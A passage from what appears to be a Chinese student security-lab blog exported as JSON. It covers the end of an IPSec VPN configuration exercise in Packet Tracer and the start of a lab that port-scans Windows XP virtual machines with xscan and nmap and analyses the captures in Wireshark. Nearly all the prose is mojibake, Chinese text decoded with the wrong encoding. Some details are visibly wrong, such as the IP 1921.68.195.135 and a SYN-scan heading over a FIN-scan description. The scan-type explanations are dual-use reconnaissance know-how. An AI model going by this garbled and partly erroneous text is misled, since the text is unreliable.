å¯†æ–¹å¼å’Œè®¤è¯æ–¹å¼ï¼Œé…ç½®IPSecï¼Œè¾“å…¥å‘½ä»¤å¦‚ä¸‹\n1 2 3 4 5 6 7 8 Router (config)#access-list 110 permit ip 192.168.1.0 0.0.0.255 192.168.2.0 0.0.0.255\t//å®šä¹‰è®¿é—®æ§åˆ¶åˆ—è¡¨,è¿™é‡Œçš„è®¿é—®æ§åˆ¶åˆ—è¡¨ä¸æ˜¯å¯¹æ•°æ®è¿›è¡Œè¿‡æ»¤ï¼Œæ˜¯å®šä¹‰é‚£äº›æ•°æ®åº”è¯¥è¢«åŠ å¯†ï¼Œä¹Ÿå¯ä»¥ç†è§£å“ªäº›æ•°æ®è§¦å‘IPSec æµ Router (config)#crypto ipsec transform-set mine esp-des esp-md5-hmac\t//è®¾ç½®æ•°æ®çš„åŠ å¯†æ–¹å¼ï¼Œç­–ç•¥åå­—ä¸ºmineï¼Œä½¿ç”¨ESP-DESå¯¹æ•°æ®åŠ å¯†ï¼ŒESP-MD5-HMACå¯¹æ•°æ®è®¤è¯ Router(config)# crypto map mymap 101 ipsec-isakmp //å®šä¹‰ä¸€ä¸ªmap,è°ƒç”¨åˆšæ‰åšçš„ç­–ç•¥ Router(config-crypto-map)# match address 110\t//åŒ¹é…å‡ºè®¿é—®æ§åˆ¶åˆ—è¡¨110çš„æ•°æ® Router(config-crypto-map)# set peer 10.0.0.2 //æ ‡è¯†å¯¹ç«¯è·¯ç”±å™¨çš„åˆæ³•IPåœ°å€ Router(config-crypto-map)# set pfs group2 Router(config-crypto-map)# set transform-set mine //ä½¿ç”¨åˆšæ‰å®šä¹‰å¥½çš„ç­–ç•¥å¯¹æ•°æ®åŠ å¯† Router(config-crypto-map)# set security-association lifetime seconds 86400\t//æŒ‡å®šIPSec SAçš„å­˜æ´»æœŸ å°†mapæ˜ å°„åˆ°å…¬ç½‘ç«¯å£ï¼Œä¸€ä¸ªç«¯å£åªèƒ½æ˜ å°„ä¸€ä¸ªmapï¼Œè¾“å…¥å‘½ä»¤å¦‚ä¸‹\n1 2 3 4 Routerï¼ˆconfigï¼‰interface fastEthernet 0/0 Router(config-if)#crypto map mymap *Jan 3 07:16:26.785: %CRYPTO-6-ISAKMP_ON_OFF: ISAKMP is ON Routerï¼ˆconfig-ifï¼‰end æŸ¥çœ‹ç­–ç•¥\næŸ¥çœ‹IKEç­–ç•¥\n1 Router# show crypto isakmp policy æŸ¥çœ‹IPSecå˜æ¢é›†\n1 Router# show crypto ipsec transform-set æŸ¥çœ‹ crypto maps\n1 Router# show crypto map é…ç½®router 1ï¼ŒåŒå‡»router 1å›¾æ ‡ï¼Œé€‰æ‹©CLIé¡¹ï¼Œè¿›å…¥è·¯ç”±å™¨é…ç½®çª—å£\nå®šä¹‰IKEçš„ç­–ç•¥ï¼Œä¸é…ç½®route 0ç›¸åŒ å®šä¹‰æ•°æ®çš„åŠ å¯†æ–¹å¼å’Œè®¤è¯æ–¹å¼ï¼Œé…ç½®IPSecï¼Œä¸é…ç½®route 0ç›¸åŒ å°†mapæ˜ å°„åˆ°å…¬ç½‘ç«¯å£ï¼Œä¸é…ç½®route 0ç›¸åŒ 5.2 æµ‹è¯•IPSec VPN æµ‹è¯•VPNè¿é€šæ€§\nåŒå‡»PC0å›¾æ ‡ï¼Œåœ¨å¼¹å‡ºçš„å¯¹è¯æ¡†ä¸­ï¼Œé€‰æ‹©Desktopï¼Œé€‰æ‹©Command Promptï¼Œping 192.168.2.10ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤º\néªŒè¯æ•°æ®ç»è¿‡IPSec VPN åŠ å¯†ä¼ è¾“ï¼Œç‚¹å‡»è¿›å…¥simulation modeï¼Œå¼¹å‡ºå¦‚å›¾æ‰€ç¤ºå¯¹è¯æ¡†\né‡å¤ä¸Šä¸€æ­¥æ“ä½œï¼Œsimulation Panelä¸­é€‰å–Auto Captureï¼Œè§‚å¯Ÿå·¥ä½œåŒºåŠ¨ç”»ï¼Œå±•ç¤ºäº†æ•°æ®åŒ…åœ¨ç½‘ç»œä¸­çš„ä¼ é€è¿‡ç¨‹\nåŒå‡»è·¯ç”±å™¨router 0å¤„æ•°æ®åŒ…ï¼Œå¼¹å‡ºå¦‚å›¾æ‰€ç¤ºå¼¹æ¡†ï¼Œå¯ä»¥åˆ†æå‡ºæ•°æ®åŒ…çš„ä¿¡æ¯\nè¿›å…¥è·¯ç”±å™¨çš„æ•°æ®åŒ…ï¼ˆå·¦ä¾§ï¼‰çš„ä¿¡æ¯æºIPæ˜¯192.168.1.10ï¼Œç›®çš„IPæ˜¯192.168.2.10 è·¯ç”±å™¨å‡ºå»çš„æ•°æ®åŒ…(å³ä¾§)çš„æºIPæ”¹å˜ä¸º10.0.0.1ï¼Œç›®çš„IPå˜ä¸º10.0.0.2 ä»ä¸Šå›¾çš„ç¬¬å…­æ¡ä¿¡æ¯ä¸­å‘ç°ESP encrypts the received packetçš„ä¿¡æ¯ ç»¼ä¸Šï¼Œä»PC0ï¼ˆ192.168.1.10ï¼‰å‘å¾€å¯¹ç«¯PC3ï¼ˆ192.168.2.10ï¼‰çš„æ•°æ®ç»è¿‡äº†è·¯ç”±å™¨çš„IPSec VPNæ¨¡å—åŠ å¯†å¤„ç†ï¼Œéšè—äº†å†…ç½‘çš„IPåœ°å€ä¿¡æ¯ï¼Œä»è€Œä¿æŠ¤äº†å†…ç½‘çš„æ•°æ® æ–­å¼€VPN\næ–­å¼€router 0\n1 2 3 Routerï¼ˆconfigï¼‰#interface fastEthernet 0/0 Router(config-if)#no crypto map mymap Routerï¼ˆconfig-ifï¼‰end åŒå‡»PC0å›¾æ ‡ï¼Œåœ¨å¼¹å‡ºçš„å¯¹è¯æ¡†ä¸­ï¼Œé€‰æ‹©Desktopï¼Œé€‰æ‹©Command Promptï¼Œping 192.168.2.10ï¼Œpingä¸é€šï¼Œè¡¨æ˜åªæ–­å¼€ä¸€ç«¯è·¯ç”±å™¨çš„ç«¯å£mapæ˜ å°„ï¼Œä¸¤è¾¹æ— æ³•è¿é€š\nä»¥åŒæ ·çš„æ–¹å¼æ–­å¼€route 1\n1 2 3 Routerï¼ˆconfigï¼‰#interface fastEthernet 0/0 Router(config-if)#no crypto map mymap Routerï¼ˆconfig-ifï¼‰end åŒå‡»PC0å›¾æ ‡ï¼Œåœ¨å¼¹å‡ºçš„å¯¹è¯æ¡†ä¸­ï¼Œé€‰æ‹©Desktopï¼Œé€‰æ‹©Command Promptï¼Œping 192.168.2.10ï¼ŒpingæˆåŠŸï¼Œè¡¨æ˜ä¸¤ç«¯éƒ½æ–­å¼€åï¼Œä¸¤è¾¹ç½‘ç»œå¯ä»¥å†æ¬¡ä¿æŒè¿æ¥\næŠ“å–ç»è¿‡route 0çš„æ•°æ®åŒ…ï¼Œå‘ç°æ•°æ®ä¸å†åŠ å¯†ä¼ è¾“ã€‚\n0x06 æ€»ç»“ é€šè¿‡é…ç½®IPSECï¼Œæ˜ç™½AHå’ŒESPçš„åŒºåˆ«ã€‚ é…ç½®OPEN VPN,PacketTrace å¯¹å±€åŸŸç½‘çš„æ¶æ„æœ‰äº†ä¸€å®šçš„äº†è§£ã€‚ é…ç½®å¤šä¸ªVPNï¼Œæ˜ç™½äº†VPNçš„å·¥ä½œåŸç†ã€‚ ","permalink":"http://www.reus09.top/posts/tech/vpn%E9%85%8D%E7%BD%AE/","summary":"VPNé…ç½®å®éªŒ 0x01 å®éªŒå†…å®¹ åœ¨Windows IPSECé…ç½®å®éªŒä¸­ï¼Œé€šè¿‡æŠ“åŒ…å·¥å…·æŠ“å–IKE SAå’ŒIPSEC SAå»ºç«‹è¿‡ç¨‹çš„æ•°æ®åŒ…ï¼Œå¹¶è¿›è¡Œåˆ†æï¼›æ€è€ƒï¼š","title":"Vpné…ç½®"},{"content":"ç½‘ç»œæ‰«æ 0x01 å®éªŒç›®çš„ ç”¨xscanã€nmapå’Œnessusè½¯ä»¶è¿›è¡Œä¸»æœºã€ç«¯å£ã€æ¼æ´æ‰«æå®éªŒï¼Œæ•è·æ‰«ææ—¶äº¤äº’çš„æ•°æ®åŒ…ï¼Œé€šè¿‡åˆ†ææ‰«ææ•°æ®åŒ…ï¼ŒéªŒè¯æ‰«æåŸç†ã€‚ æ‰¾åˆ°ä¸€ç§å¸¸è§çš„ä¸»æœºç³»ç»Ÿæˆ–åº”ç”¨ç¨‹åºæ¼æ´ï¼Œç ”ç©¶è¯¥æ¼æ´çš„æ‰«æåŸç†ï¼Œå¯¹è¯¥æ¼æ´è¿›è¡Œæ‰«æå™¨æ‰«æå®éªŒï¼Œé€šè¿‡åˆ†ææ•è·çš„æ‰«ææ•°æ®åŒ…éªŒè¯æ¼æ´æ‰«æåŸç†ã€‚(é€‰åš) ç¼–ç¨‹å®ç°TCPå…¨è¿æ¥æˆ–åŠè¿æ¥çš„ç«¯å£æ‰«æã€‚ï¼ˆé€‰åšï¼‰ 0x02 å®éªŒå‰æçŸ¥è¯† ç½‘ç»œæ‰«æå™¨çš„ä¸»è¦åŠŸèƒ½\næ‰«æç›®æ ‡ä¸»æœºè¯†åˆ«å…¶å·¥ä½œçŠ¶æ€ï¼ˆå¼€/å…³æœºï¼‰ è¯†åˆ«ç›®æ ‡ä¸»æœºç«¯å£çš„çŠ¶æ€ï¼ˆç›‘å¬/å…³é—­ï¼‰ è¯†åˆ«ç›®æ ‡ä¸»æœºç³»ç»ŸåŠæœåŠ¡ç¨‹åºçš„ç±»å‹å’Œç‰ˆæœ¬ æ ¹æ®å·²çŸ¥æ¼æ´ä¿¡æ¯ï¼Œåˆ†æç³»ç»Ÿè„†å¼±ç‚¹ ç”Ÿæˆæ‰«æç»“æœæŠ¥å‘Š æ‰«æå™¨çš„åŸºæœ¬å·¥ä½œåŸç†\nç½‘ç»œæ‰«ææŠ€æœ¯\nä¸»æœºæ‰«ææŠ€æœ¯\nä¸»æœºæ‰«æçš„ç›®çš„æ˜¯ç¡®å®šåœ¨ç›®æ ‡ç½‘ç»œä¸Šçš„ä¸»æœºæ˜¯å¦å¯è¾¾ã€‚è¿™æ˜¯ä¿¡æ¯æ”¶é›†çš„åˆçº§é˜¶æ®µï¼Œå…¶æ•ˆæœç›´æ¥å½±å“åˆ°åç»­çš„æ‰«æã€‚ ä¼ ç»Ÿæ‰«ææ‰‹æ®µ ICMP Echoæ‰«æ ICMP Sweepæ‰«æ Broadcast ICMPæ‰«æ Non-Echo ICMPæ‰«æ é˜²ç«å¢™å’Œç½‘ç»œè¿‡æ»¤è®¾å¤‡å¸¸å¸¸å¯¼è‡´ä¼ ç»Ÿçš„æ¢æµ‹æ‰‹æ®µå˜å¾—æ— æ•ˆã€‚ä¸ºäº†çªç ´è¿™ç§é™åˆ¶ï¼Œå¿…é¡»é‡‡ç”¨ä¸€äº›éå¸¸è§„çš„æ‰‹æ®µï¼Œåˆ©ç”¨ICMPåè®®æä¾›ç½‘ç»œé—´ä¼ é€é”™è¯¯ä¿¡æ¯çš„æ‰‹æ®µï¼Œå¾€å¾€å¯ä»¥æ›´æœ‰æ•ˆçš„è¾¾åˆ°ç›®çš„ï¼š å¼‚å¸¸çš„IPåŒ…å¤´ åœ¨IPå¤´ä¸­è®¾ç½®æ— æ•ˆçš„å­—æ®µå€¼ é”™è¯¯çš„æ•°æ®åˆ†ç‰‡ é€šè¿‡è¶…é•¿åŒ…æ¢æµ‹å†…éƒ¨è·¯ç”±å™¨ åå‘æ˜ å°„æ¢æµ‹ ç«¯å£æ‰«ææŠ€æœ¯\nç¡®å®šç›®æ ‡ä¸»æœºå¯è¾¾åï¼Œä½¿ç”¨ç«¯å£æ‰«ææŠ€æœ¯ï¼Œå‘ç°ç›®æ ‡ä¸»æœºçš„å¼€æ”¾ç«¯å£ï¼ŒåŒ…æ‹¬ç½‘ç»œåè®®å’Œå„ç§åº”ç”¨ç›‘å¬çš„ç«¯å£ã€‚\nå¼€æ”¾æ‰«æ ä¼šäº§ç”Ÿå¤§é‡çš„å®¡è®¡æ•°æ®ï¼Œå®¹æ˜“è¢«å¯¹æ–¹å‘ç°ï¼Œä½†å…¶å¯é æ€§é«˜\nTCP Connect æ‰«æ TCPåå‘identæ‰«æ éšè”½æ‰«æ\nèƒ½æœ‰æ•ˆçš„é¿å…å¯¹æ–¹å…¥ä¾µæ£€æµ‹ç³»ç»Ÿå’Œé˜²ç«å¢™çš„æ£€æµ‹ï¼Œä½†è¿™ç§æ‰«æä½¿ç”¨çš„æ•°æ®åŒ…åœ¨é€šè¿‡ç½‘ç»œæ—¶å®¹æ˜“è¢«ä¸¢å¼ƒä»è€Œäº§ç”Ÿé”™è¯¯çš„æ¢æµ‹ä¿¡æ¯\nTCP FIN æ‰«æ TCP Xmasæ‰«æ TCP Null æ‰«æ TCP ftp proxyæ‰«æ åˆ†æ®µæ‰«æ åŠå¼€æ”¾æ‰«æ\néšè”½æ€§å’Œå¯é æ€§ä»‹äºå‰ä¸¤è€…ä¹‹é—´ã€‚\nTCP SYN æ‰«æ TCPé—´æ¥æ‰«æ UDPç«¯å£æ‰«æ\næ ˆæŒ‡çº¹OSè¯†åˆ«æŠ€æœ¯\næ ¹æ®å„ä¸ªOSåœ¨TCP/IPåè®®æ ˆå®ç°ä¸Šçš„ä¸åŒç‰¹ç‚¹ï¼Œé‡‡ç”¨é»‘ç›’æµ‹è¯•æ–¹æ³•ï¼Œé€šè¿‡ç ”ç©¶å…¶å¯¹å„ç§æ¢æµ‹çš„å“åº”å½¢æˆè¯†åˆ«æŒ‡çº¹ï¼Œè¿›è€Œè¯†åˆ«ç›®æ ‡ä¸»æœºè¿è¡Œçš„æ“ä½œç³»ç»Ÿ è¢«åŠ¨æ‰«æ é€šè¿‡Snifferæ”¶é›†æ•°æ®åŒ…ï¼Œå†å¯¹æ•°æ®åŒ…çš„ä¸åŒç‰¹å¾ï¼ˆTCP Window\u0002sizeã€ IP TTLã€IP TOSã€DFä½ç­‰å‚æ•°ï¼‰è¿›è¡Œåˆ†æï¼Œæ¥è¯†åˆ«æ“ä½œç³»ç»Ÿã€‚ ä¸»åŠ¨æ‰«æ é‡‡ç”¨å‘ç›®æ ‡ç³»ç»Ÿå‘é€æ„é€ çš„ç‰¹æ®ŠåŒ…å¹¶ç›‘æ§å…¶åº”ç­”çš„æ–¹å¼æ¥è¯†åˆ«æ“ä½œç³»ç»Ÿç±»å‹ã€‚ æ¼æ´æ‰«ææŠ€æœ¯\nåœ¨ç«¯å£æ‰«æåå¾—çŸ¥ç›®æ ‡ä¸»æœºå¼€å¯çš„ç«¯å£ä»¥åŠç«¯å£ä¸Šçš„ç½‘ç»œæœåŠ¡ï¼Œå°†è¿™äº›ç›¸å…³ä¿¡æ¯ä¸ç½‘ç»œæ¼æ´æ‰«æç³»ç»Ÿæä¾›çš„æ¼æ´åº“è¿›è¡ŒåŒ¹é…ï¼ŒæŸ¥çœ‹æ˜¯å¦æœ‰æ»¡è¶³åŒ¹é…æ¡ä»¶çš„æ¼æ´å­˜åœ¨ã€‚ é€šè¿‡æ¨¡æ‹Ÿé»‘å®¢çš„æ”»å‡»æ‰‹æ³•ï¼Œå¯¹ç›®æ ‡ä¸»æœºç³»ç»Ÿè¿›è¡Œæ”»å‡»æ€§çš„å®‰å…¨æ¼æ´æ‰«æï¼Œå¦‚æµ‹è¯•å¼±åŠ¿å£ä»¤ç­‰ã€‚è‹¥æ¨¡æ‹Ÿæ”»å‡»æˆåŠŸï¼Œåˆ™è¡¨æ˜ç›®æ ‡ä¸»æœºç³»ç»Ÿå­˜åœ¨å®‰å…¨æ¼æ´ã€‚ CGIæ¼æ´æ‰«æã€POP3æ¼æ´æ‰«æã€FTPæ¼æ´æ‰«æã€SSHæ¼æ´æ‰«æã€HTTPæ¼æ´æ‰«æç­‰ã€‚è¿™äº›æ¼æ´æ‰«ææ˜¯åŸºäºæ¼æ´åº“ï¼Œå°†æ‰«æç»“æœä¸æ¼æ´åº“ç›¸å…³æ•°æ®åŒ¹é…æ¯”è¾ƒå¾—åˆ°æ¼æ´ä¿¡æ¯ã€‚ Unicodeéå†ç›®å½•æ¼æ´æ¢æµ‹ã€FTP å¼±å¯†ç æ¢æµ‹ã€OPENRelayé‚®ä»¶è½¬å‘æ¼æ´æ¢æµ‹ç­‰ï¼Œè¿™äº›æ‰«æé€šè¿‡ä½¿ç”¨æ’ä»¶ï¼ˆåŠŸèƒ½æ¨¡å—æŠ€æœ¯ï¼‰è¿›è¡Œæ¨¡æ‹Ÿæ”»å‡»ï¼Œæµ‹è¯•å‡ºç›®æ ‡ä¸»æœºçš„æ¼æ´ä¿¡æ¯ã€‚ 0x03 å®éªŒç¯å¢ƒ Winodows xp æ±‡ç¼– IP:192.168.195.135 MAC: 00-0c-29-19-ba-6e Winodows xp ç½‘ç»œå®‰å…¨å®éªŒ IP:192.168.195.131 MAC:00-0c-29-06-65-c9 Windows 7 IP:192.168.195.145 MAC:00-0c-29-f1-b5-17 ç¨‹åºè¿è¡Œæœºå™¨ Ubuntu 16 ç½‘å…³ IP : 192.168.195.2 MAC : 00-50-56-e7-d4-22 å·¥å…· xscan nmap nessus wireshark 0x04 è½¯ä»¶æ‰«æ xscan xscan é…ç½® å‚æ•°\nå¼€å§‹æ‰«æ\næ‰«æç»“æœ WiresharkæŠ“åŒ…åˆ†æ\né¦–å…ˆåº”è¯¥æ˜¯ SYNåŠæ‰«æç«¯å£æ˜¯å¦å¼€æ”¾\næºIP(192.168.195.131)éšæœºç«¯å£å‘é€tcp-synè¿æ¥ç»™ç›®çš„IP(1921.68.195.135)\nå› ä¸ºæ‰«æäº†1024ä¸ªç«¯å£ï¼Œè¿™é‡Œåªæ”¾ç¬¬ä¸€ä¸ªå’Œæœ€åä¸€ä¸ªç«¯å£çš„æˆªå›¾\nSYNæ‰«æå®ç°åŸç†ï¼šæ‰«æå™¨å‘ç›®æ ‡ä¸»æœºç«¯å£å‘é€SYNåŒ…ã€‚å¦‚æœåº”ç­”æ˜¯RSTåŒ…ï¼Œé‚£ä¹ˆè¯´æ˜ç«¯å£æ˜¯å…³é—­çš„ï¼›å¦‚æœåº”ç­”ä¸­åŒ…å«SYNå’ŒACKåŒ…ï¼Œè¯´æ˜ç›®æ ‡ç«¯å£å¤„äºç›‘å¬çŠ¶æ€ï¼Œå†ä¼ é€ä¸€ä¸ªRSTåŒ…ç»™ç›®æ ‡æœºä»è€Œåœæ­¢å»ºç«‹è¿æ¥ã€‚\nå¯ä»¥çœ‹åˆ°å¤§é‡çš„tcp-synè¯·æ±‚ï¼Œè¿”å›çš„å‡ä¸ºRST,æ ‡æ˜è¯¥ç«¯å£æ²¡æœ‰å¼€æ”¾\nå¦‚æœè¿”å›ä¸ºSYN+ACK,åˆ™è¡¨æ˜ç«¯å£å¼€æ”¾\nTCP Connect æ‰«æ\nå®ç°åŸç†ï¼šé€šè¿‡è°ƒç”¨socketå‡½æ•°connect()è¿æ¥åˆ°ç›®æ ‡è®¡ç®—æœºä¸Šï¼Œå®Œæˆä¸€æ¬¡å®Œæ•´çš„ä¸‰æ¬¡æ¡æ‰‹è¿‡ç¨‹ã€‚å¦‚æœç«¯å£å¤„äºä¾¦å¬çŠ¶æ€ï¼Œé‚£ä¹ˆconnect()å°±èƒ½æˆåŠŸè¿”å›ã€‚å¦åˆ™ï¼Œè¿™ä¸ªç«¯å£ä¸å¯ç”¨ï¼Œå³æ²¡æœ‰æä¾›æœåŠ¡ã€‚ é€šè¿‡ä¸‰æ¬¡æ¡æ‰‹ï¼ŒæŸ¥çœ‹ç«¯å£æ˜¯å¦å¼€æ”¾ï¼Œå¹¶è¿›è¡Œä¸€å®šçš„ä½¿ç”¨ ftps ssh http https sslv2åè®®è¯•æ¢\nUDPç«¯å£æ‰«æ\nå‘ç›®æ ‡ç«¯å£å‘é€UDP åŒ…ã€‚å¦‚æœå¾—åˆ°çš„åº”ç­”ä¸ºâ€œICMP port Unreachableâ€ï¼ˆICMP ç«¯å£ä¸å¯åˆ°è¾¾ï¼‰ï¼Œé‚£ä¹ˆç›®æ ‡ç«¯å£æ˜¯å…³é—­çš„ã€‚ åä¹‹ï¼Œå¦‚æœæ²¡æœ‰æ”¶åˆ°è¿™ä¸ªåº”ç­”æ¶ˆæ¯ï¼Œåˆ™ç›®æ ‡ç«¯å£ææœ‰å¯èƒ½æ˜¯å¼€æ”¾çš„ã€‚ ç»“åˆæŠ¥å‘Šï¼Œxscanä¸»è¦å¯¹netbios-ssn(139/tcp)ã€https (443/tcp)ã€FTP-ssl (990/tcp)ã€ssh (22/tcp)ã€www (443/tcp)ã€ftp (990/tcp)ã€microsoft-ds (445/tcp)ã€ftp (21/tcp)ã€epmap (135/tcp)ã€www (80/tcp)ã€netbios-ns (137/udp)ã€ntp (123/udp)\nnmap å‚æ•°è®¾ç½®\né¦–å…ˆå¼€å¯çš„ä¸º TCP SYNæ‰«æ\nTCP - SYNæ‰«æ\næ‰«æå™¨å‘ç›®æ ‡ä¸»æœºç«¯å£å‘é€FINåŒ…ã€‚å½“ä¸€ä¸ªFINæ•°æ®åŒ…åˆ°è¾¾ä¸€ä¸ªå…³é—­çš„ç«¯å£ï¼Œæ•°æ®åŒ…ä¼šè¢«ä¸¢æ‰ï¼Œå¹¶ä¸”è¿”å›ä¸€ä¸ªRSTæ•°æ®åŒ…ã€‚å¦åˆ™ï¼Œè‹¥æ˜¯æ‰“å¼€çš„ç«¯å£ï¼Œæ•°æ®åŒ…åªæ˜¯ç®€å•çš„ä¸¢æ‰ï¼ˆä¸è¿”å›RSTï¼‰ã€‚ WiresharkæŠ“åŒ…\nã€ å‘ç°æ— æ•ˆï¼Œå› ä¸ºTCP SYNæ‰«æé€šå¸¸é€‚ç”¨äºUNIXç›®æ ‡ä¸»æœºï¼Œä½†åœ¨Windows95/NTç¯å¢ƒä¸‹ï¼Œè¯¥æ–¹æ³•æ— æ•ˆã€‚å› ä¸ºä¸è®ºç›®æ ‡ç«¯å£æ˜¯å¦æ‰“å¼€ï¼Œæ“ä½œç³»ç»Ÿéƒ½è¿”å›RSTåŒ…ã€‚æˆ‘ä»¬è¿™é‡Œçš„ç›®æ ‡ä¸»æœºæ˜¯xpç³»ç»Ÿï¼Œæ‰€ä»¥æ— è®ºä»€ä¹ˆç«¯å£éƒ½ä¼šå›æ˜¾RSTåŒ… å¼€å¯ TCP ACK æ‰«æ\nTCP-ACKæ‰«æ TCP ACKæ‰«ææ˜¯åˆ©ç”¨æ ‡å¿—ä½ACKï¼Œè€ŒACKæ ‡å¿—åœ¨TCPåè®®ä¸­è¡¨ç¤ºç¡®è®¤åºå·æœ‰æ•ˆï¼Œå®ƒè¡¨ç¤ºç¡®è®¤ä¸€ä¸ªæ­£å¸¸çš„TCPè¿æ¥ã€‚ä½†æ˜¯åœ¨TCP ACKæ‰«æä¸­æ²¡æœ‰è¿›è¡Œæ­£å¸¸çš„TCPè¿æ¥è¿‡ç¨‹ï¼Œå®é™…ä¸Šæ˜¯æ²¡æœ‰çœŸæ­£çš„TCPè¿æ¥ã€‚é‚£ä¹ˆå½“å‘é€ä¸€ä¸ªå¸¦æœ‰ACKæ ‡å¿—çš„TCPæŠ¥æ–‡åˆ°ç›®æ ‡ä¸»æœºçš„ç«¯å£æ—¶ï¼Œç›®æ ‡ä¸»æœºä¼šæ€æ ·ååº”å‘¢ï¼Ÿ ä½¿ç”¨TCP ACKæ‰«æä¸èƒ½å¤Ÿç¡®å®šç«¯å£çš„å…³é—­æˆ–è€…å¼€æ”¾ï¼Œå› ä¸ºå½“å‘é€ç»™å¯¹æ–¹ä¸€ä¸ªå«æœ‰ACKè¡¨ç¤ºçš„TCPæŠ¥æ–‡çš„æ—¶å€™ï¼Œéƒ½è¿”å›å«æœ‰RSTæ ‡å¿—çš„æŠ¥æ–‡ï¼Œæ— è®ºç«¯å£æ˜¯å¼€æ”¾æˆ–è€…å…³é—­ã€‚æ‰€ä»¥ï¼Œä¸èƒ½ä½¿ç”¨TCP ACKæ‰«ææ¥ç¡®å®šç«¯å£æ˜¯å¦å¼€æ”¾æˆ–è€…å…³é—­ã€‚ä½†æ˜¯å¯ä»¥åˆ©ç”¨å®ƒæ¥æ‰«æé˜²ç«å¢™çš„é…ç½®ï¼Œç”¨å®ƒæ¥å‘ç°é˜²ç«å¢™è§„åˆ™ï¼Œç¡®å®šå®ƒä»¬æ˜¯æœ‰çŠ¶æ€çš„è¿˜æ˜¯æ— çŠ¶æ€çš„ï¼Œå“ªäº›ç«¯å£æ˜¯è¢«è¿‡æ»¤çš„ WiresharkæŠ“åŒ… å¯ä»¥çœ‹åˆ°æºä¸»æœºå‘é€çš„TCPè¯·æ±‚åŒ…ä¸­ï¼ŒACKç›´æ¥è¢«åˆå§‹åŒ–äº†ï¼Œæ²¡æœ‰äº†SYNè¿‡ç¨‹ å¼€å¯TCP - Xmas æ‰«æ\nTCP - Xmas æ‰«æ TCP Xmaså’ŒNullæ‰«ææ˜¯FINæ‰«æçš„ä¸¤ä¸ªå˜ç§ã€‚Xmasæ‰«ææ‰“å¼€FINï¼ŒURGå’ŒPUSHæ ‡è®°ï¼Œè€ŒNullæ‰«æå…³é—­æ‰€æœ‰æ ‡è®°ã€‚ è¿™äº›ç»„åˆçš„ç›®çš„æ˜¯ä¸ºäº†é€šè¿‡å¯¹FINæ ‡è®°æ•°æ®åŒ…çš„è¿‡æ»¤ã€‚ å½“æ­¤ç±»æ•°æ®åŒ…åˆ°è¾¾ä¸€ä¸ªå…³é—­çš„ç«¯å£ï¼Œæ•°æ®åŒ…ä¼šè¢«ä¸¢æ‰ï¼Œå¹¶ä¸”è¿”å›ä¸€ä¸ªRSTæ•°æ®åŒ…ã€‚å¦åˆ™ï¼Œè‹¥æ˜¯æ‰“å¼€çš„ç«¯å£ï¼Œæ•°æ®åŒ…åªæ˜¯ç®€å•çš„ä¸¢æ‰ï¼ˆä¸è¿”å›RSTï¼‰ã€‚ Wireshak æŠ“åŒ… å¯ä»¥çœ‹åˆ°å‘çš„æºIPåŒ…é‡Œé¢å¸¦æœ‰Urgentã€Finã€Pushå­—æ®µ TCP - Connect æ‰«æ\né€šè¿‡è°ƒç”¨socketå‡½æ•°connect()è¿æ¥åˆ°ç›®æ ‡è®¡ç®—æœºä¸Šï¼Œå®Œæˆä¸€æ¬¡å®Œæ•´çš„ä¸‰æ¬¡æ¡æ‰‹è¿‡ç¨‹ã€‚å¦‚æœç«¯å£å¤„äºä¾¦å¬çŠ¶æ€ï¼Œé‚£ä¹ˆconnect()å°±èƒ½æˆåŠŸè¿”å›ã€‚å¦åˆ™ï¼Œè¿™ä¸ªç«¯å£ä¸å¯ç”¨ï¼Œå³æ²¡æœ‰æä¾›æœåŠ¡\nWireshark æŠ“åŒ…\nå¯ä»¥çœ‹åˆ°æˆ‘ä»¬å¼€æ”¾çš„httpç«¯å£ç»è¿‡TCPä¸‰æ¬¡è¿æ¥å¯ä»¥è¿æ¥ï¼Œè€Œå¦ä¸€ä¸ªç«¯å£æ— æ³•è¿æ¥ï¼Œè¿”å›ä¸€ä¸ªRSTåŒ…\nå¼€å¯ TCP NULL æ‰«æ\nTCP NULL æ‰«æ TCP Xmaså’ŒNullæ‰«ææ˜¯FINæ‰«æçš„ä¸¤ä¸ªå˜ç§ã€‚è€ŒNullæ‰«æå…³é—­æ‰€æœ‰æ ‡è®°ã€‚è¿™äº›ç»„åˆçš„ç›®çš„æ˜¯ä¸ºäº†é€šè¿‡å¯¹FINæ ‡è®°æ•°æ®åŒ…çš„è¿‡æ»¤ã€‚å½“æ­¤ç±»æ•°æ®åŒ…åˆ°è¾¾ä¸€ä¸ªå…³é—­çš„ç«¯å£ï¼Œæ•°æ®åŒ…ä¼šè¢«ä¸¢æ‰ï¼Œå¹¶ä¸”è¿”å›ä¸€ä¸ªRSTæ•°æ®åŒ…ã€‚å¦åˆ™ï¼Œè‹¥æ˜¯æ‰“å¼€çš„ç«¯å£ï¼Œæ•°æ®åŒ…åªæ˜¯ç®€å•çš„ä¸¢æ‰ï¼ˆä¸è¿”å›RSTï¼‰ã€‚ å¯ä»¥çœ‹åˆ°æˆ‘ä»¬å¼€æ”¾çš„ç«¯å£éƒ½æ²¡æœ‰å›æ˜¾ï¼Œå…³é—­çš„ç«¯å£éƒ½è¿”å›ä¸€ä¸ªRSTã€ACKåŒ… å¼€å¯ TCP æ»‘åŠ¨çª—å£æ‰«æ\nå…¶å®å°±æ˜¯å¤§é‡çš„TCP ACKæ‰«æ\næ ¹æ®æŠ“åŒ…ï¼Œå‘ç°å…¶å³ä¸ºé€šè¿‡åŒæ—¶å‘é€å¤§é‡çš„ACKåŒ…ï¼Œè¿™é‡Œæ˜¯TCP ACKæ‰«æ\nåŒæ—¶å¤§é‡è¿”å›å¯¹ä¸Šè¿°åŒ…çš„RSTåŒ…æ¥æŸ¥çœ‹ç«¯å£æ˜¯å¦å¼€æ”¾ã€‚\nTCP FIN æ‰«æ\nTCP FIN æ‰«æ æ‰«æå™¨å‘ç›®æ ‡ä¸»æœºç«¯å£å‘é€FINåŒ…ã€‚å½“ä¸€ä¸ªFINæ•°æ®åŒ…åˆ°è¾¾ä¸€ä¸ªå…³é—­çš„ç«¯å£ï¼Œæ•°æ®åŒ…ä¼šè¢«ä¸¢æ‰ï¼Œå¹¶ä¸”è¿”å›ä¸€ä¸ªRSTæ•°æ®åŒ…ã€‚å¦åˆ™ï¼Œè‹¥æ˜¯æ‰“å¼€çš„ç«¯å£ï¼Œæ•°æ®åŒ…åªæ˜¯ç®€å•çš„ä¸¢æ‰ï¼ˆä¸è¿”å›RSTï¼‰ã€‚ Wiresharkåˆ†æ 